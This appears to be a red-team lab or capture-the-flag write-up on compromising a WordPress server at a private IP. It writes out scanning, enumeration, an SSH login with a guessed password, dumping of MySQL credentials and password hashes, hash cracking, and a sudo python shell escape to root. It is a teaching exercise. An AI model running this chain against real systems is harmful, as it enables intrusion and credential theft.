# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

## Exposed Services
Nmap scan results for each machine reveal the below services and OS details:  
~~~
nmap -sV 192.168.1  
~~~

![red1](https://user-images.githubusercontent.com/32025331/155894956-f1c31fe2-82f8-4a57-a74d-95c5a0dda68f.PNG)

This scan identifies the services below as potential points of entry:  
  
Target 1  
- OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)  
- Apache httpd 2.4.10 ((Debian))  
  
The following vulnerabilities were identified on each target:
- Target 1
- Weak server password
- Unsalted hashed passwords
- Unpatched WordPress software
  
 ## Exploitation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:


**flag1{b9bbcb33e11b80be759c4e844862482d}**  
Tools used: dirb, wpscan  
- Using dirb we were able to find a wordpress page: 192.168.1.110/wordpress  
- From there we ran wpscan: 
~~~
wpscan –url http://192.168.1.110/wordpress
~~~
![red2](https://user-images.githubusercontent.com/32025331/155894957-b9e4c47b-09d7-43ff-9d0f-d4a3ef808915.PNG)

We then found two login names: Steven and Michael  
![red3](https://user-images.githubusercontent.com/32025331/155894958-c2fc6d12-f3ff-47b4-93a7-9a038cbdac2a.PNG)

By sheer luck, we guessed the password without brute force:  
~~~
ssh michael@192.168.1.110
Password:  michael
cd ../../var/www/html
grep -RE flag1
~~~
![red4](https://user-images.githubusercontent.com/32025331/155894959-9c35c8ed-fc7c-4049-8b13-c03f6d785452.PNG)  
  
**flag2{fc3fd58dcdad9ab23faca6e9a36e581c}**  
- Follow same steps as flag 1 to ssh into the server  
~~~ 
cd ../../var/www/
grep -RE flag2
~~~


**flag3{afc01ab56b50591e7dccf93122770cd2}**  
**flag4{715dea6c055b9fe3337544932f2941ce}**  
Tools used: SSH, MySQL  
~~~
ssh michael@192.168.1.110
Password: michael
cd /var/www/html/wordpress
nano wp-config.php  
~~~

![red5](https://user-images.githubusercontent.com/32025331/155894960-bc91d0f1-f6ac-4d95-bc81-c3027734bba8.PNG)  
Within wp-config.php we were able to find credentials to a MySQL database.
~~~
mysql -u root -pR@v3nSecurity
show databases;
use wordpress;
show tables;
select post_content from wp_posts;
~~~
![red9](https://user-images.githubusercontent.com/32025331/155896987-d9932ea6-75bb-4b88-ae79-67f5b9a46999.PNG)  
  
**Flag 4 from Steven’s account:  **  
- Tools used: SSH, MySQL, johntheripper  
- Using the MySQL credentials from before:  
~~~
mysql -u root -pR@v3nSecurity
show databases;
use wordpress;
show tables;
select user_login, user_pass from wp_users;
~~~  
We found the hashed passwords within ^#%$.  
Exit back out to Kali. From here we can use John the Ripper:  
![red6](https://user-images.githubusercontent.com/32025331/155894961-05ed83c8-ab77-40f0-b8e0-33995815607d.PNG)  
SSH into the webserver using Steven’s credentials:  
~~~
Ssh steven@192.168.1.110
Password: pink84
~~~
Now we run a python exploit:
~~~
sudo /usr/bin/python -c 'import os;os.system("/bin/sh")'
cd root
cat flag4.txt
~~~
[picture]
